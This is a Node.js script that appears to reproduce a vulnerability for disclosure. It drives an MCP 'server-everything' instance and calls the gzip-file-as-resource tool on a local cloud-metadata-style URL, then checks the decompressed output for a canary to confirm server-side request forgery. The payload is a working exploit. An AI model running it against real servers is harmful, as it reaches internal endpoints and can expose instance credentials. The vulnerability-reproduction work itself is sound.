import { spawn } from 'child_process';
import path from 'path';
import zlib from 'zlib';

const SERVER_PATH = path.resolve('node_modules/@modelcontextprotocol/server-everything/dist/index.js');

// Deliberately NOT setting GZIP_ALLOWED_DOMAINS - testing default/common config
const proc = spawn('node', [SERVER_PATH], {
  env: { PATH: process.env.PATH, HOME: process.env.HOME },
  stdio: ['pipe', 'pipe', 'pipe'],
});

let buffer = '';
proc.stdout.on('data', (chunk) => { buffer += chunk.toString(); });
proc.stderr.on('data', (chunk) => { console.log('[server stderr]', chunk.toString().trim()); });

function sendMessage(msg) {
  proc.stdin.write(JSON.stringify(msg) + '\n');
}
async function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

async function main() {
  await sleep(500);
  sendMessage({ jsonrpc: '2.0', id: 1, method: 'initialize', params: { protocolVersion: '2024-11-05', capabilities: {}, clientInfo: { name: 'vata-dsc-repro', version: '1.0.0' } } });
  await sleep(500);
  sendMessage({ jsonrpc: '2.0', method: 'notifications/initialized' });
  await sleep(300);

  // Real tool call targeting the local internal-endpoint stub
  sendMessage({
    jsonrpc: '2.0', id: 2, method: 'tools/call',
    params: {
      name: 'gzip-file-as-resource',
      arguments: {
        name: 'ssrf-test',
        data: 'http://127.0.0.1:18081/latest/meta-data/',
        outputType: 'resource',
      },
    },
  });
  await sleep(2000);
  proc.kill();

  console.log('--- Raw response ---');
  console.log(buffer);

  // Extract and decompress the returned blob if present
  const match = buffer.match(/"blob":"([^"]+)"/);
  if (match) {
    const gzipped = Buffer.from(match[1], 'base64');
    const decompressed = zlib.gunzipSync(gzipped).toString();
    console.log('\n--- Decompressed fetched content ---');
    console.log(decompressed);
    console.log(`\nSSRF CONFIRMED (internal endpoint reached with no GZIP_ALLOWED_DOMAINS set): ${decompressed.includes('VATA_SSRF_CANARY')}`);
  } else {
    console.log('\nNo resource blob found in response - tool call may have failed or been blocked.');
  }
}
main();
